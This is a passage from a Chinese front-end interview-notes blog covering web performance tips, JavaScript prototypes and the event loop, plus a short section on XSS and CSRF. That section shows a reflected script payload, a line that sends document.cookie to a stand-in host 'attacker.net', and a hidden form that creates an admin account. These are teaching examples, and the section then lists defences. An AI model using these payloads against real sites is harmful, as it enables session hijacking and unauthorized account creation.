class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 不推荐 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"photo\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"合理设置-etag-和-last-modified\">合理设置 Etag 和 Last-Modified</span></h3>\n<p>合理设置 Etag 和 Last-Modified 使用浏览器缓存，对于未修改的文件，静态资源服务器会向浏览器端返回 304 ，让浏览器从缓存中读取文件，减少 Web 资源下载的带宽消耗并降低服务器负载。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Last-Modified\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"Mon, 03 Oct 2017 17:45:57 GMT\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"减少页面重定向\">减少页面重定向</span></h3>\n<p>页面每次重定向都会延长页面内容返回的等待延时，一次重定向大约需要 600 毫秒的时间开销，为了保证用户尽快看到页面的内容，要尽量避免页面重定向。</p>\n<h3><span id=\"使用静态资源分域存放来增加下载并行数\">使用静态资源分域存放来增加下载并行数</span></h3>\n<p>浏览器在同一时刻向同一个域名请求文件的并行下载数是有限的，因此可以利用多个域名的主机来存放不同的静态资源，增大页面加载时资源的并行下载数，缩短页面资源加载的时间。通常根据多个域名来分别存储 JavaScript、CSS 和图片文件。</p>\n<p><strong>但是这个策略需要慎用，因为过多的域名会造成DNS解析开销</strong></p>\n<h3><span id=\"cdn\">CDN</span></h3>\n<h4><span id=\"使用静态资源-cdn-来存储文件\">使用静态资源 CDN 来存储文件</span></h4>\n<p>如果条件允许，可以利用 CDN 网络加快同一个地理区域内重复静态资源文件的响应下载速度，缩短资源请求时间。</p>\n<h4><span id=\"使用-cdn-combo-下载传输内容\">使用 CDN Combo 下载传输内容</span></h4>\n<p>CDN Combo 是在 CDN 服务器端将多个文件请求打包成一个文件的形式来返回的技术，这样可以实现 HTTP 连接传输的一次复用，减少浏览器的 HTTP 请求数，加快资源下载速度。例如同一个域名 CDN 服务器上的 a.js，b.js，c.js 就可以按如下方式在一个请求中下载。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn.domain.com/path/a.js,b.js,c.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>这种方式我在微信公众号后台看到过</strong></p>\n<h3><span id=\"使用-get-来完成-ajax-请求\">使用 GET 来完成 AJAX 请求</span></h3>\n<p>使用 XMLHttpRequest 时，浏览器中的 POST 方法发送请求首先发送文件头，然后发送 HTTP 正文数据。而使用 GET 时只发送头部，所以在拉取服务端数据时使用 GET 请求效率更高。</p>\n<h3><span id=\"减少-cookie-的大小并进行-cookie-隔离\">减少 Cookie 的大小并进行 Cookie 隔离</span></h3>\n<p>HTTP 请求通常默认带上浏览器端的 Cookie 一起发送给服务器，所以在非必要的情况下，要尽量减少 Cookie 来减小 HTTP 请求的大小。对于静态资源，尽量使用不同的域名来存放，因为 Cookie 默认是不能跨域的，这样就做到了不同域名下静态资源请求的 Cookie 隔离。</p>\n<h3><span id=\"使用异步-javascript-资源\">使用异步 JavaScript 资源</span></h3>\n<p>异步的 JavaScript 资源不会阻塞文档解析，所以允许在浏览器中优先渲染页面，延后加载脚本执行。例如 JavaScript 的引用可以如下设置，也可以使用模块化加载机制来实现。比如 requireJS、Seajs等</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用defer时，加载后续文档元素的过程和main.js的加载是并行的，但main.js的执行要在页面所有元素解析完成之后才开始执行</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/main.js\"</span> <span class=\"attr\">defer</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> </span><br><span class=\"line\">//使用async时，加载后续文档元素的过程和main.js的加载是并行的</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/main.js\"</span> <span class=\"attr\">async</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"使用base64编码\">使用base64编码</span></h3>\n<p>小文件应转换成base64编码，如小图，字体文件，音频等，尽量减少http请求</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.class-name</span> &#123;</span><br><span class=\"line\">   <span class=\"attribute\">background-image </span>: <span class=\"built_in\">url</span>(<span class=\"string\">'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAMAAABxsOwqAAAAYFBMVEWnxwusyQukxQudwQyZvgyhxAyfwgyxzAsUHQGOuA0aJAERGAFIXwSTugyEqgtqhghQZgUwQQIpOQKbuguVtQuKrAuCowp2kQlheghTbQZHWQU7SwVAVgQ6TgQlLwMeKwFOemyQAAAAVElEQVQI1y3JVRaAIAAF0UconXbvf5ei8HfPDIQQhBAAFE10iKig3SLRNN4SP/p+N08VC0YnfIlNWtqIkhg/TPYbCvhqdHAWRXPZSp3g3CWZvVLXC6OJA3ukv0AaAAAAAElFTkSuQmCC'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3><span id=\"图片视频懒加载\">图片/视频懒加载</span></h3>\n<p>为了保证页面内容的最小化，加速页面的渲染，尽可能节省移动端网络流量，页面中的图片资源推荐使用懒加载实现，在页面滚动时动态载入图片。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">data-src</span>=<span class=\"string\">\"https://user-gold-cdn.xitu.io/2017/12/29/160a1604f3efd980\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"懒加载图片\"</span> &gt;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"使用-iconfont-代替图片图标\">使用 iconfont 代替图片图标</span></h3>\n<p>在页面中尽可能使用 iconfont 来代替图片图标，这样做的好处有以下几个：</p>\n<ul>\n<li>使用 iconfont 体积较小，而且是矢量图，因此缩放时不会失真；</li>\n<li>可以方便地修改图片大小尺寸和呈现颜色。</li>\n</ul>\n<h2><span id=\"页面渲染类\">页面渲染类</span></h2>\n<h3><span id=\"把-css-资源引用放到-html-文件顶部\">把 CSS 资源引用放到 HTML 文件顶部</span></h3>\n<p>一般推荐将所有 CSS 资源尽早指定在 HTML 文档 <head> 中，这样浏览器可以优先加载 CSS 并尽早完成页面渲染。</head></p>\n<h3><span id=\"javascript-资源引用放到-html-文件底部\">JavaScript 资源引用放到 HTML 文件底部</span></h3>\n<p>JavaScript 资源放到 HTML 文档底部可以防止 JavaScript 的加载和解析执行对页面渲染造成阻塞。由于 JavaScript 资源默认是解析阻塞的，除非被标记为异步或者通过其他的异步方式加载，否则会阻塞 HTML DOM 解析和 CSS 渲染的过程。</p>\n<h3><span id=\"不要在-html-中直接缩放图片\">不要在 HTML 中直接缩放图片</span></h3>\n<p>在 HTML 中直接缩放图片会导致页面内容的重排重绘，此时可能会使页面中的其他操作产生卡顿，因此要尽量减少在页面中直接进行图片缩放。</p>\n<h3><span id=\"减少-dom-元素数量和深度\">减少 DOM 元素数量和深度</span></h3>\n<p>HTML 中标签元素越多，标签的层级越深，浏览器解析 ** DOM** 并绘制到浏览器中所花的时间就越长，所以应尽可能保持 DOM 元素简洁和层级较少。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--不推荐--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript: void(0);\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./path/photo.jpg\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"图片\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!--推荐--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./path/photo.jpg\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"图片\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"尽量避免使用-table-iframe等慢元素\">尽量避免使用 table、iframe等慢元素</span></h3>\n<p>table内容的渲染是将 table 的 DOM 渲染树全部生成完并一次性绘制到页面上的，所以在长表格渲染时很耗性能，应该尽量避免使用它，可以考虑使用列表元素 ul 代替。尽量使用异步的方式动态添加 iframe 内资源的下载进程会阻塞父页面静态资源的下载与 CSS 及 HTML DOM的解析。</p>\n<h3><span id=\"避免运行耗时的-javascript\">避免运行耗时的 Javascript</span></h3>\n<p>长时间运行的 JavaScript 会阻塞浏览器构建 DOM 树、DOM 渲染树、渲染页面。所以，任何与页面初次渲染无关的逻辑功能都应该延迟加载执行，这和 JavaScript 资源的异步加载思路是一致的。</p>\n<h3><span id=\"避免使用-css-表达式或-css-滤镜\">避免使用 CSS 表达式或 CSS 滤镜</span></h3>\n<p>CSS 表达式或 CSS 滤镜的解析渲染速度是比较慢的，在有其他解决方案的情况下应该尽量避免使用。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 不推荐 */</span></span><br><span class=\"line\"><span class=\"selector-class\">.opacity</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">filter</span>:progid:DXImageTransform.Microsoft.<span class=\"built_in\">Alpha</span>(opacity=50);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1><span id=\"安全\">安全</span></h1>\n<h2><span id=\"xss和csrf的原理以及怎么预防\">xss和csrf的原理以及怎么预防</span></h2>\n<h3><span id=\"xss\">XSS</span></h3>\n<p>用户浏览网页时发送错误，向服务器请求 URL，<a href=\"http://xn--www-eo8er22f.xxx.com/error.php?message=sorry,an\" target=\"_blank\" rel=\"noopener\">比如www.xxx.com/error.php?message=sorry,an</a> error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板中：<code>&lt;p&gt;sorry,an error occurred&lt;/p&gt;</code>，返回给用户。</p>\n<p>这个漏洞有一个显著的特征，应用程序没有进行任何过滤或净化措施，就非常容易受到攻击。<code>www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;</code>，当用户打开错误页面时，就会出现<code>&lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;</code>，弹出一个消息框。</p>\n<p>显然，攻击人员不会很傻的仅仅 alert 一些消息，在 IE 中，如果开启跨站点脚本检测可能无法弹出消息。通常 XSS 都会伴随着会话劫持，攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。<br>\n比如攻击者构造一个这样的 URL，message 信息如下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"keyword\">new</span> Image;</span><br><span class=\"line\">i.src=<span class=\"string\">\"http://attacker.net/\"</span>+<span class=\"built_in\">document</span>.cookie;</span><br></pre></td></tr></table></figure>\n<p>这样被攻击者通过访问这个恶意的 URL，就会把 cookie 发送给黑客，黑客截获 cookie，就能执行用户的任意操纵。</p>\n<h3><span id=\"osrf\">OSRF</span></h3>\n<p>跨站点请求伪造才是跨站伪造的重点内容，攻击者只需要创建一个看似无害的网站，致使受害者的浏览器直接向易受攻击的服务器提交一个请求，执行恶意代码。<br>\n仍然需要考虑同源策略，以管理员创建新用户为例，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /newUser.php HTTP/1.1</span><br><span class=\"line\">Host: xxx.com</span><br><span class=\"line\">Cookie: SessionId=...</span><br><span class=\"line\">Content-Length: ..</span><br><span class=\"line\"></span><br><span class=\"line\">name=ro&amp;userrole=admin&amp;password=123456&amp;confirmpassword=123456</span><br></pre></td></tr></table></figure>\n<p>黑客构造的网站会提交一个 form 表单，并想办法让 form 隐藏：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://xxx.com/newUser.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"ro\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"userrole\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"admin\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"password\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"123456\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"confirmpassword\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"123456\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当管理员已经登陆的情况下，访问这个恶意网站的时候，就会提交这段脚本，管理员都不知情。因为管理员已经登陆，无需考虑 Cookie 的问题，一个简单的 CSRF 如此。<br>\n<strong>应对办法</strong></p>\n<ol>\n<li>对一些关键字和特殊字符进行过滤或 URL、HTML 编码，&quot;&lt;&gt;?“或&quot;script，javascript”；</li>\n<li>Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；</li>\n<li>验证HTTP Referer</li>\n<li>在请求中添加 token 并验证</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1>javascript篇</h1>\n<h2>prototype和__proto__的关系是什么</h2>\n<p>先看一段代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\"> name, age </span>) </span>&#123; </span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> p = <span class=\"keyword\">new</span> Person( <span class=\"string\">'xiaoming'</span>, <span class=\"number\">19</span> );</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log( p.__proto__ == Person.prototype );</span><br><span class=\"line\"><span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p><code>__proto__</code>是每个对象都有的一个属性，而<code>prototype</code>是函数才会有的属性，查找资料后是这么描述<code>__proto__</code>的：</p>\n<blockquote>\n<p>对象具有属性<code>__proto__</code>，可称为隐式原型，一个对象的隐式原型指向构造该对象的构造函数的原型，这也保证了实例能够访问在构造函数原型中定义的属性和方法。</p>\n</blockquote>\n<p>而<code>prototype</code>是这么描述的</p>\n<blockquote>\n<p>方法(Function)这个特殊的对象，除了和其他对象一样有上述__proto__属性之外，还有自己特有的属性——原型属性（prototype），这个属性是一个指针，指向一个对象，这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）。原型对象也有一个属性，叫做constructor，这个属性包含了一个指针，指回原构造函数。</p>\n</blockquote>\n<p>用一张简单的图就能概括二者关系<br>\n<img src=\"20180228144215.jpg\" alt=\"示例\"></p>\n<h2>JavaScript 异步、栈、事件循环、任务队列</h2>\n<p>嗯，还是开局一张图<br>\n<img src=\"4020255170-59bc9e1671029_articlex.png\" alt=\"示例\"><br>\n有这么一段代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bar</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);</span><br><span class=\"line\">  bar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">3</span>)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<p>它在栈中的入栈、出栈过程，如下图：<br>\n<img src=\"1021884518-59bc9e30d414a_articlex.png\" alt=\"示例\"></p>\n<p>看到这里，我就联想到了平时使用浏览器的debug功能的时候，在断点处停住时能看到的<code>call stack</code>。<br>\n这里我们有个概念叫<strong>任务队列</strong>，js中，有两类任务队列：宏任务队列（macro tasks）和微任务队列（micro tasks）。宏任务队列可以有多个，微任务队列只有一个。下面是常见的一些任务的任务队列：</p>\n<ul>\n<li>宏任务：script（全局任务）, setTimeout, setInterval, setImmediate, I/O, UI rendering.</li>\n<li>微任务：process.nextTick, Promise, Object.observer, MutationObserver.<br>\n比如有这样的代码</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'timeout1'</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">resolve</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise1'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>; i++) &#123;</span><br><span class=\"line\">        i == <span class=\"number\">99</span> &amp;&amp; resolve();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise2'</span>);</span><br><span class=\"line\">&#125;).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'then1'</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'global1'</span>);</span><br></pre></td></tr></table></figure>\n<p>比如上面这样的一段代码，<code>setTimeout</code>是一个宏任务源，所以里面的回调函数<code>console.log('timeout1')</code>会被加到宏任务队列中。到了Promise，输出promise1以及promise2，for循环内执行resolve时，由于Promise是一个微任务源，所以<code>console.log('then1')</code>回调会被加到微任务队列中。继续执行代码，输出grobal1。这个时候，执行栈上的代码已经执行完毕，所以此时我们执行微任务队列，此时的微任务队列上有<code>console.log('then1')</code>，所以浏览器输出then1。至此，一轮的事件循环已经执行完毕，开启新的一轮事件循环。也是从<code>宏任务-&gt;执行栈-&gt;微任务</code>。由于此时宏任务上有事件<code>console.log('timeout1')</code>，所以输出timeout1。这就是整段代码执行情况的理解。依次输出如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promise1</span><br><span class=\"line\">promise2</span><br><span class=\"line\">global1</span><br><span class=\"line\">then1</span><br><span class=\"line\">timeout1</span><br></pre></td></tr></table></figure>\n<h3>nodejs中的process.nextTick和setImmediate</h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.nextTick(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">A</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">  process.nextTick(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">B</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);&#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timeout</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'TIMEOUT FIRED'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"comment\">// TIMEOUT FIRED</span></span><br></pre></td></tr></table></figure>\n<p>上面代码中，由于process.nextTick方法指定的回调函数，总是在当前&quot;执行栈&quot;的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前&quot;执行栈&quot;执行。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setImmediate(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  setImmediate(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">A</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"number\">1</span>);</span><br><span class=\"line\">    setImmediate(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">B</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"built_in\">console</span>.log(<span class=\"number\">2</span>);&#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">timeout</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'TIMEOUT FIRED'</span>);</span><br><span class=\"line\">  &#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"comment\">// TIMEOUT FIRED</span></span><br><span class=\"line\"><span class=\"comment\">// 2</span></span><br></pre></td></tr></table></figure>\n<p>上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1–TIMEOUT FIRED–2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行</p>\n<p>我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前&quot;执行栈&quot;一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>\n<h2>事件模型</h2>\n<h3>DOM0级模型</h3>\n<p>又称为原始事件模型，在该模型中，事件不会传播，即没有事件流的概念。事件绑定监听函数比较简单, 有两种方式:</p>\n<ul>\n<li>HTML代码中直接绑定:</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">onclick</span>=<span 